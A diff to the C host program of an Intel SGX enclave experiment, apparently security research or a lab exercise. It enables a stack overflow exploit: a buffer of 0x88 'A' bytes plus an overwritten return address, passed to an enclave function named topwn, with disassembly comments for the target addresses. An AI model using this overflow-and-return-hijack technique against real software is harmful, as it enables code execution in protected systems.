@@ -137,29 +137,29 @@ int SGX_CDECL main(int argc, char *argv[])
     setActionCounter(global_eid, &actionCounter);
     setBucket(global_eid, &bucket);
 
-    char ubuff[] = "ciao";
+    char ubuff[] = "hi!!";
     // RUN_AND_DUMP(MODE, "hello1", hello1(global_eid, 1))
     topwn(global_eid, (char*)ubuff, sizeof(ubuff));
     // dumpLen(MODE, "test_exception", &actionCounter);
 
 
-    // uint8_t exploit[500] = {0};
-    // size_t len = 0;
+    uint8_t exploit[500] = {0};
+    size_t len = 0;
 
-    // for (len = 0; len < 0x88; len++)
-    //   exploit[len] = 'A';
+    for (len = 0; len < 0x88; len++)
+      exploit[len] = 'A';
 
-    // add(&exploit[len], 0x1e0c + baseAddr, &len);
+    add(&exploit[len], 0x1e0c + baseAddr, &len);
     
-    // // return from A() to topwn()
-    // // 1d1c:       48 8d 05 ad 00 00 00    lea    rax,[rip+0xad]        # 1dd0 <_Z1bPcm>
+    // return from A() to topwn()
+    // 1d1c:       48 8d 05 ad 00 00 00    lea    rax,[rip+0xad]        # 1dd0 <_Z1bPcm>
 
-    // // return from A() to B()
-    // // 1e0c:       48 8b 7d 08             mov    rdi,QWORD PTR [rbp+0x
+    // return from A() to B()
+    // 1e0c:       48 8b 7d 08             mov    rdi,QWORD PTR [rbp+0x
 
-    // // RUN_AND_DUMP(MODE, "hello1", hello1(global_eid, 1))
-    // topwn(global_eid, (char*)exploit, sizeof(exploit));
-    // // dumpLen(MODE, "test_exception", &actionCounter);
+    // RUN_AND_DUMP(MODE, "hello1", hello1(global_eid, 1))
+    topwn(global_eid, (char*)exploit, sizeof(exploit));
+    // dumpLen(MODE, "test_exception", &actionCounter);
 
 
     makeEndMsg(global_eid);
